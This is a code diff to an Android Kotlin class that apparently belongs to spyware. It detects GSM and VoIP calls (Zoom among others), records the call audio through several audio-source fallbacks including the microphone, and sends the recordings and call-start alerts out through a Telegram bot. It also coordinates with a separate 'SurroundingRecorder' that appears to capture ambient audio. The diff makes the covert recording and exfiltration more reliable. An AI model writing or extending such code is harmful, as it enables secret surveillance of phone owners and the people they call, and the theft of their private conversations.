@@ -33,20 +33,27 @@ class CallRecorder(private val context: Context) {
         "us.zoom.videomeetings"
     )
 
+    // ── API 31+ ───────────────────────────────────────────────────────────────
     private val telephonyCallback: TelephonyCallback? = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
         object : TelephonyCallback(), TelephonyCallback.CallStateListener {
-            override fun onCallStateChanged(state: Int) { handleCallState(state) }
+            override fun onCallStateChanged(state: Int) {
+                handleCallState(state)
+            }
         }
     } else null
 
+    // ── API < 31 ──────────────────────────────────────────────────────────────
     @Suppress("DEPRECATION")
     private val phoneStateListener: PhoneStateListener? = if (Build.VERSION.SDK_INT < Build.VERSION_CODES.S) {
         object : PhoneStateListener() {
             @Deprecated("Deprecated in Java")
-            override fun onCallStateChanged(state: Int, phoneNumber: String?) { handleCallState(state) }
+            override fun onCallStateChanged(state: Int, phoneNumber: String?) {
+                handleCallState(state)
+            }
         }
     } else null
 
+    // ── Broadcast fallback (some OEMs need this) ──────────────────────────────
     private val phoneReceiver = object : BroadcastReceiver() {
         override fun onReceive(ctx: Context, intent: Intent) {
             when (intent.getStringExtra(TelephonyManager.EXTRA_STATE)) {
@@ -59,14 +66,22 @@ class CallRecorder(private val context: Context) {
     private fun handleCallState(state: Int) {
         when (state) {
             TelephonyManager.CALL_STATE_OFFHOOK -> {
-                if (!isRecording) { SurroundingRecorder.pause(); startRecording("gsm") }
+                if (!isRecording) {
+                    SurroundingRecorder.pause()
+                    TelegramListener.instance.sendMessage("📞 Call started — recording...")
+                    startRecording("gsm")
+                }
             }
             TelephonyManager.CALL_STATE_IDLE -> {
-                if (isRecording) { stopAndSend("📞 GSM Call"); SurroundingRecorder.resume() }
+                if (isRecording) {
+                    stopAndSend("📞 GSM Call")
+                    SurroundingRecorder.resume()
+                }
             }
         }
     }
 
+    // ── VOIP ──────────────────────────────────────────────────────────────────
     private var voipActive = false
     private var voipCheckRunning = false
 
@@ -75,9 +90,16 @@ class CallRecorder(private val context: Context) {
             if (!isRecording) {
                 val current = getForegroundApp()
                 if (current in voipApps) {
-                    if (!voipActive) { voipActive = true; SurroundingRecorder.pause(); startRecording("voip_${current.substringAfterLast('.')}") }
+                    if (!voipActive) {
+                        voipActive = true
+                        SurroundingRecorder.pause()
+                        TelegramListener.instance.sendMessage("📱 VOIP call started ($current) — recording...")
+                        startRecording("voip_${current.substringAfterLast('.')}")
+                    }
                 } else if (voipActive) {
-                    voipActive = false; stopAndSend("📱 VOIP Call"); SurroundingRecorder.resume()
+                    voipActive = false
+                    stopAndSend("📱 VOIP Call")
+                    SurroundingRecorder.resume()
                 }
             }
             if (voipCheckRunning) handler.postDelayed(this, 1500)
@@ -94,6 +116,7 @@ class CallRecorder(private val context: Context) {
     }
 
     fun start() {
+        // TelephonyCallback (API 31+) or PhoneStateListener (older)
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S && telephonyCallback != null) {
                 telephonyManager.registerTelephonyCallback(context.mainExecutor, telephonyCallback)
@@ -101,20 +124,38 @@ class CallRecorder(private val context: Context) {
                 @Suppress("DEPRECATION")
                 telephonyManager.listen(phoneStateListener, PhoneStateListener.LISTEN_CALL_STATE)
             }
-        } catch (e: Exception) { Log.e("CallRecorder", "telephony register error: ${e.message}") }
-        try { context.registerReceiver(phoneReceiver, IntentFilter(TelephonyManager.ACTION_PHONE_STATE_CHANGED)) } catch (e: Exception) {}
+        } catch (e: Exception) {
+            Log.e("CallRecorder", "telephony register error: ${e.message}")
+        }
+
+        // Broadcast fallback — belt-and-suspenders
+        try {
+            context.registerReceiver(phoneReceiver, IntentFilter(TelephonyManager.ACTION_PHONE_STATE_CHANGED))
+        } catch (e: Exception) {}
+
         voipCheckRunning = true
         handler.post(voipChecker)
     }
 
     fun startRecording(label: String) {
         if (isRecording) return
-        for (source in listOf(MediaRecorder.AudioSource.VOICE_CALL, MediaRecorder.AudioSource.VOICE_RECOGNITION)) {
+
+        // Try VOICE_CALL first, then VOICE_RECOGNITION as fallback
+        val sources = listOf(
+            MediaRecorder.AudioSource.VOICE_CALL,
+            MediaRecorder.AudioSource.VOICE_RECOGNITION,
+            MediaRecorder.AudioSource.MIC
+        )
+
+        for (source in sources) {
             try {
                 val ts = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
                 outputFile = File(context.cacheDir, "${label}_$ts.mp4")
-                recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) MediaRecorder(context)
-                           else @Suppress("DEPRECATION") MediaRecorder()
+
+                recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
+                    MediaRecorder(context)
+                else @Suppress("DEPRECATION") MediaRecorder()
+
                 recorder?.apply {
                     setAudioSource(source)
                     setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
@@ -122,40 +163,56 @@ class CallRecorder(private val context: Context) {
                     setAudioSamplingRate(44100)
                     setAudioEncodingBitRate(128000)
                     setOutputFile(outputFile!!.absolutePath)
-                    prepare(); start()
+                    prepare()
+                    start()
                 }
                 isRecording = true
+                Log.d("CallRecorder", "Recording started with source=$source label=$label")
                 return
             } catch (e: Exception) {
-                Log.e("CallRecorder", "start($source) error: ${e.message}")
+                Log.e("CallRecorder", "source=$source failed: ${e.message}")
                 try { recorder?.release() } catch (_: Exception) {}
                 recorder = null
             }
         }
+
+        Log.e("CallRecorder", "All audio sources failed for $label")
+        TelegramListener.instance.sendMessage("⚠️ Call detected but recording failed.")
         SurroundingRecorder.resume()
     }
 
     fun stopAndSend(caption: String = "📞 Call") {
         if (!isRecording) return
         try { recorder?.apply { stop(); release() } } catch (e: Exception) {}
-        recorder = null; isRecording = false
+        recorder = null
+        isRecording = false
+
         outputFile?.let { file ->
-            if (file.exists() && file.length() > 2048) {
+            if (file.exists() && file.length() > 1024) {
                 val ts = SimpleDateFormat("dd MMM yyyy, HH:mm", Locale.getDefault()).format(Date())
-                TelegramListener.instance.sendAudio(file.absolutePath, "$caption — $ts")
-            } else file.delete()
+                // sendVoice — inline voice bubble in Telegram, more reliable for call audio
+                TelegramListener.instance.sendVoice(file.absolutePath, "$caption — $ts")
+            } else {
+                Log.w("CallRecorder", "Recording too small or missing: ${file.length()} bytes")
+                TelegramListener.instance.sendMessage("⚠️ $caption recorded but file too small (${file.length()} bytes).")
+                file.delete()
+            }
         }
     }
 
     fun stop() {
         voipCheckRunning = false
         handler.removeCallbacksAndMessages(null)
+
         try {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S && telephonyCallback != null)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S && telephonyCallback != null) {
                 telephonyManager.unregisterTelephonyCallback(telephonyCallback)
-            else if (phoneStateListener != null)
-                @Suppress("DEPRECATION") telephonyManager.listen(phoneStateListener, PhoneStateListener.LISTEN_NONE)
+            } else if (phoneStateListener != null) {
+                @Suppress("DEPRECATION")
+                telephonyManager.listen(phoneStateListener, PhoneStateListener.LISTEN_NONE)
+            }
         } catch (e: Exception) {}
+
         try { context.unregisterReceiver(phoneReceiver) } catch (e: Exception) {}
         if (isRecording) stopAndSend()
     }
